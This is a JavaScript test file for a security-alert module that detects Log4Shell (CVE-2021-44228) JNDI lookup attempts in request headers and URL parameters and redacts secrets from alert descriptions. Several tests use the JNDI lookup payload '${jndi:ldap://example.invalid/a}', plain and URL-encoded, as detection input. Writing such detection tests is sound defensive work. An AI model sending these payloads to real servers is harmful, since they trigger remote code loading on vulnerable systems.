import assert from 'node:assert/strict';
import { readFile, mkdtemp, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import { test } from 'node:test';
import { Script } from 'node:vm';
import { projectAlert, readAlerts, safeDescription } from '../xdr/known-cve/read-alerts.mjs';
import * as standalone from '../xdr/known-cve/decide.mjs';

const fixtureUrl = new URL('../xdr/fixtures/known-cve.json', import.meta.url);
const readerUrl = new URL('../xdr/known-cve/read-alerts.mjs', import.meta.url);
const fields = ['timestamp', 'sourceIp', 'account', 'level', 'description'];

const source = await readFile(new URL('../xdr/known-cve/decide.mjs', import.meta.url), 'utf8');
const isolated = () => new Script(source.replace('export function decide', 'function decide')
  + '\n({ decide, classify: result });').runInNewContext({}, { timeout: 1000 });

test('R11: 패턴 전체 사본과 유일한 동기 export, 빈 환경의 독립 실행', async () => {
  const catalog = JSON.parse(await readFile(new URL('../xdr/known-cve/patterns.json', import.meta.url), 'utf8'));
  const copied = new Script(source.slice(0, source.indexOf('\nfunction text')) + '\nJSON.stringify(PATTERNS);').runInNewContext({});
  assert.deepEqual(JSON.parse(copied), catalog.patterns);
  assert.deepEqual(Object.keys(standalone), ['decide']);
  assert.doesNotMatch(source, /\bimport\b|\b(?:require|fetch|XMLHttpRequest|WebSocket|eval)\s*\(|\bprocess\b|\basync\s+function/u);
  const { decide } = isolated();
  const output = decide({});
  assert.equal(output instanceof Promise, false);
  assert.deepEqual(Object.keys(output), ['action', 'confidence', 'reason']);
});

test('R12: 0.5와 0.85의 정확한 행동 경계 및 입력 점수 무시', () => {
  const { classify, decide } = isolated();
  for (const [score, expected] of [[0, 'record'], [0.499999, 'record'], [0.5, 'alert'],
    [0.849999, 'alert'], [0.85, 'block'], [1, 'block']]) {
    assert.equal(classify(score, 'test').action, expected);
  }
  assert.equal(decide({ action: 'block', confidence: 1, reason: 'fixture-canary' }).action, 'record');
});

test('R13: 원격 조회는 머리글·인자에서만 block, 설명·부분·점검 흔적은 alert', () => {
  const { decide } = isolated();
  const lookup = '${jndi:ldap://example.invalid/a}';
  const header = decide({ data: { useragent: lookup } });
  assert.equal(header.action, 'block');
  assert.equal(header.reason, 'header_jndi_lookup');
  for (const value of [lookup, encodeURIComponent(lookup), encodeURIComponent(encodeURIComponent(lookup))]) {
    const output = decide({ data: { url: '/search?q=' + value } });
    assert.equal(output.action, 'block');
    assert.equal(output.reason, 'parameter_jndi_lookup');
  }
  for (const [alert, reason] of [
    [{ rule: { description: '머리글에 원격 조회 구문이 있습니다.' } }, 'header_jndi_lookup'],
    [{ rule: { description: '요청 인자의 원격 조회 구문이 있습니다.' } }, 'parameter_jndi_lookup'],
    [{ rule: { description: '알려진 취약점 점검 흔적이 있습니다.' } }, 'vulnerability_scanner_trace'],
    [{ data: { useragent: '${jndi:ldap://example.invalid/a' } }, 'header_jndi_lookup'],
    [{ data: { url: '/?q=' + encodeURIComponent('${jndi:ldap://example.invalid/a') } }, 'parameter_jndi_lookup'],
    [{ data: { url: '/?q=CVE-2021-44228' } }, 'parameter_jndi_lookup'],
  ]) {
    const output = decide(alert);
    assert.equal(output.action, 'alert');
    assert.equal(output.reason, reason);
  }
  for (const alert of [
    { rule: { description: '공개 화면을 열었습니다.', level: 16 }, data: { count: '999999' } },
    { rule: { description: '머리글에 원격 조회 구문은 없습니다.' } },
    { rule: { description: '알려진 취약점 점검 흔적은 없습니다.' } },
    { data: { useragent: '{example}', url: '/notes' } },
    { data: { url: '/notes#?q=' + lookup } },
    { data: { url: '/' + lookup } },
    { full_log: lookup, data: { password: lookup } },
  ]) assert.equal(decide(alert).action, 'record');
});

test('R14·R15: 전체 경보·잘못된 입력을 동기 처리하고 원문·호출 순서를 보존한다', async () => {
  const fixture = JSON.parse(await readFile(fixtureUrl, 'utf8'));
  const before = JSON.stringify(fixture);
  const { decide } = isolated();
  const outputs = fixture.alerts.map(decide);
  assert.ok(outputs.slice(0, 8).every(output => output.action === 'block'));
  assert.ok(outputs.slice(8, 16).every(output => output.action !== 'block'));
  assert.ok(outputs.slice(16).every(output => output.action === 'record'));
  const reversed = fixture.alerts.slice().reverse().map(decide).reverse();
  assert.deepEqual(outputs, reversed);
  for (const output of [...outputs, ...[null, undefined, [], 1, 'secret', {}, { data: null, rule: null },
    { data: { url: '/?q=%ZZ', useragent: 123 }, rule: { description: [] } }].map(decide)]) {
    assert.deepEqual(Object.keys(output), ['action', 'confidence', 'reason']);
    assert.ok(Number.isFinite(output.confidence) && output.confidence >= 0 && output.confidence <= 1);
    assert.equal(output.action, output.confidence >= 0.85 ? 'block' : output.confidence >= 0.5 ? 'alert' : 'record');
    assert.ok(['header_jndi_lookup', 'parameter_jndi_lookup', 'vulnerability_scanner_trace', 'no_matching_pattern'].includes(output.reason));
    assert.doesNotMatch(output.reason, /[\r\n]/u);
  }
  assert.equal(JSON.stringify(fixture), before);
  const secretOutput = decide({ data: { useragent: '${jndi:ldap://example.invalid/fixture-canary}',
    token: 'fixture-canary' }, rule: { description: 'token=fixture-canary' } });
  assert.doesNotMatch(JSON.stringify(secretOutput), /fixture-canary/u);
});

test('R7·R8: 패턴마다 이름·조건·한 줄 근거·공식 출처가 있다', async () => {
  const catalog = JSON.parse(await readFile(new URL('../xdr/known-cve/patterns.json', import.meta.url), 'utf8'));
  assert.equal(catalog.schema, 'aleph.xdr.patterns.v1');
  assert.equal(catalog.moduleKey, 'known-cve');
  assert.equal(catalog.cve, 'CVE-2021-44228');
  assert.equal(catalog.technique, 'T1190');
  assert.equal(catalog.patterns.length, 3);
  assert.equal(new Set(catalog.patterns.map(pattern => pattern.name)).size, catalog.patterns.length);
  for (const pattern of catalog.patterns) {
    assert.match(pattern.name, /^[a-z][a-z_]+$/u);
    for (const value of [pattern.condition.signal, pattern.condition.require, pattern.condition.exclude, pattern.evidence]) {
      assert.equal(typeof value, 'string');
      assert.ok(value.trim().length > 0);
      assert.doesNotMatch(value, /[\r\n\u2028\u2029]/u);
    }
    assert.ok(pattern.condition.fields.length > 0);
    assert.ok(pattern.condition.fields.every(field => ['data.useragent', 'data.url', 'rule.description'].includes(field)));
    for (const source of [pattern.source, pattern.detailSource]) {
      const url = new URL(source);
      assert.equal(url.protocol, 'https:');
      assert.ok(['logging.apache.org', 'attack.mitre.org'].includes(url.hostname));
    }
  }
});

test('R9·R10: 이름·도구 흔적만의 오탐 제외와 악용 성공·임계값의 경계를 기록한다', async () => {
  const catalog = JSON.parse(await readFile(new URL('../xdr/known-cve/patterns.json', import.meta.url), 'utf8'));
  assert.match(catalog.scopeNote, /악용 성공의 증명이 아니/u);
  assert.match(catalog.scopeNote, /임계값은 이번 제작에서 정하지 않/u);
  const [header, parameter, scanner] = catalog.patterns;
  assert.ok(header.condition.fields.includes('data.useragent'));
  assert.ok(parameter.condition.fields.includes('data.url'));
  for (const pattern of [header, parameter]) {
    assert.match(pattern.condition.signal, /완전한 JNDI 원격 조회/u);
    assert.match(pattern.condition.exclude, /단어만/u);
  }
  assert.match(scanner.condition.require, /보조 신호/u);
  assert.match(scanner.condition.require, /도구 흔적만으로 차단·악용 성공을 확정하지 않/u);
  assert.match(scanner.condition.exclude, /비슷한 수업용 프로그램/u);
  assert.equal(new URL(scanner.source).pathname, '/techniques/T1595/002/');
});

test('R1·R2·R5: 원본 24건을 다섯 항목으로 읽고 설명과 원본을 보존한다', async () => {
  const before = await readFile(fixtureUrl);
  const fixture = JSON.parse(before);
  const rows = await readAlerts();
  assert.equal(rows.length, 24);
  assert.equal(rows.length, fixture.alerts.length);
  rows.forEach((row, index) => {
    assert.deepEqual(Object.keys(row), fields);
    assert.equal(row.description, fixture.alerts[index].rule.description);
    assert.equal(row.timestamp, new Date(fixture.alerts[index].timestamp).toISOString());
    assert.equal(row.sourceIp, fixture.alerts[index].data.srcip);
    assert.equal(row.account, fixture.alerts[index].data.srcuser ?? null);
    assert.equal(row.level, fixture.alerts[index].rule.level);
  });
  assert.deepEqual(await readFile(fixtureUrl), before);
});

test('R3: 다른 필드의 비밀값과 설명에 섞인 비밀값·요청 구문을 출력하지 않는다', () => {
  const original = {
    timestamp: '2026-10-15T00:00:00Z',
    data: { srcip: '192.0.2.1', srcuser: 'user01', url: '/?token=fixture-canary', useragent: 'fixture-canary' },
    rule: { level: 12, description: 'CVE-2021-44228 형태 요청입니다.' },
    full_log: 'fixture-canary',
  };
  const before = structuredClone(original);
  assert.doesNotMatch(JSON.stringify(projectAlert(original)), /fixture-canary/u);
  assert.deepEqual(original, before);
  for (const description of [
    '토큰: 가상검사값', 'password = "short"', 'Authorization: Bearer fixture-canary',
    'Cookie: fixture-canary', 'api_key=fixture-canary', 'https://example.invalid/?q=fixture-canary',
    '${jndi:ldap://example.invalid/a}', 'fixture-canary', 'a'.repeat(40),
    'CVE-2021-44228 ' + '가'.repeat(501),
  ]) assert.equal(safeDescription(description), '[설명 제외]');
});

test('R3·R5: 누락·잘못된 필드와 실제 주소·계정은 원문 대신 안전한 값을 반환한다', () => {
  const row = projectAlert({ timestamp: '2026-10-15T00:00:00Z secret',
    data: { srcip: '8.8.8.8', srcuser: 'person@example.invalid' },
    rule: { level: 'secret', description: 'token=fixture-canary' } });
  assert.deepEqual(row, { timestamp: null, sourceIp: null, account: null, level: null, description: '[설명 제외]' });
  assert.deepEqual(Object.keys(projectAlert(null)), fields);
  assert.equal(projectAlert({ data: { srcip: '192.0.2.999', srcuser: 'admin' }, rule: { level: 17 } }).sourceIp, null);
  assert.equal(projectAlert({ rule: { level: 0 } }).level, 0);
  assert.equal(safeDescription('수업 노트에 jndi 라는 단어가 한 번 있습니다.'), '수업 노트에 jndi 라는 단어가 한 번 있습니다.');
});

test('R1·R5: CLI 표준 출력은 경보당 JSON 한 줄로 총 24줄이다', () => {
  const result = spawnSync(process.execPath, [fileURLToPath(readerUrl)], { encoding: 'utf8' });
  assert.equal(result.status, 0);
  assert.equal(result.stderr, '');
  const lines = result.stdout.trim().split(/\r?\n/u);
  assert.equal(lines.length, 24);
  for (const line of lines) assert.deepEqual(Object.keys(JSON.parse(line)), fields);
});

test('R5: 필드 없는 경보도 한 행이며 잘못된 묶음·손상 JSON은 거부한다', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'xdr-known-cve-'));
  const path = join(dir, 'fixture.json');
  try {
    await writeFile(path, JSON.stringify({ schema: 'aleph.xdr.fixture.v1', moduleKey: 'known-cve', alerts: [null, {}] }));
    assert.equal((await readAlerts(path)).length, 2);
    for (const value of [null, {}, { schema: 'aleph.xdr.fixture.v1', moduleKey: 'web-injection', alerts: [] },
      { schema: 'aleph.xdr.fixture.v1', moduleKey: 'known-cve', alerts: {} }]) {
      await writeFile(path, JSON.stringify(value));
      await assert.rejects(readAlerts(path), /가상 경보 형식/u);
    }
    await writeFile(path, '{');
    await assert.rejects(readAlerts(path), SyntaxError);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
